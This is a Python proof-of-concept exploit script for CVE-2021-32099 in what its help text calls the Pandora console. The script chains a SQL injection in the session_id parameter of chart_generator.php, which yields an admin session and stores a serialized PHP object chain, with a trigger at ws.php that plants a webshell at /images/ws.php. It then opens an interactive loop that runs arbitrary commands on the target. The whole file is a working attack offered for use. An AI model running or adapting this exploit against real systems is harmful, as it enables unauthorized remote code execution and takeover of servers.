import requests
import argparse
from urllib.parse import unquote

s = requests.Session()
def poc(base_url: str, chain_path: str) -> str:
    # Step 1: Init Access to get a "NULL" `id_session`
    res = s.get(
        url=f"{base_url}/include/chart_generator.php",
    )
    id_session = res.cookies.get("PHPSESSID")
    print(f"[*] First get `id_session` with NULL privilege: {id_session}")

    # Step 2: SQL Injection to gain session admin + save serialized POP chain
    res = s.get(
        url=f"{base_url}/include/chart_generator.php",
        params={
            "session_id": f"' UNION SELECT '1',2,'{open(chain_path).read()}"
        }
    )
    id_session = res.cookies.get("PHPSESSID")
    print(f"[*] Then perform SQL Injection to gain admin privilege...")

    # Step 3: Trigger session_decode() to execute POP chain at /ws.php
    res = s.get(url=f"{base_url}/ws.php")

    # Step 4: Checking...
    ok = s.get(url=f"{base_url}/images/ws.php", params={"c": "echo 'wakey wakey'"}).text
    if "wakey wakey" in ok:
        print("[+] Susseccfully uploaded webshell at /images/ws.php")
        print("[+] Spawning shell...")
        while True:
            try:
                cmd = input("shell> ")
                res = s.get(url=f"{base_url}/images/ws.php", params={"c": cmd})
                print(res.text[:-7])
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                exit(0)
    else:
        print("[-] Failed to upload webshell at /images/ws.php")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2021-32099: From SQLi to PHP Deserialization')
    parser.add_argument('-u', '--url'  , type=str, help='Base URL of the application (Ex: http://localhost:8080/pandora_console)', required=True)
    parser.add_argument('-f', '--file', type=str, help='Path to saved pop chains', required=True)
    args = parser.parse_args()
    poc(args.url, args.file)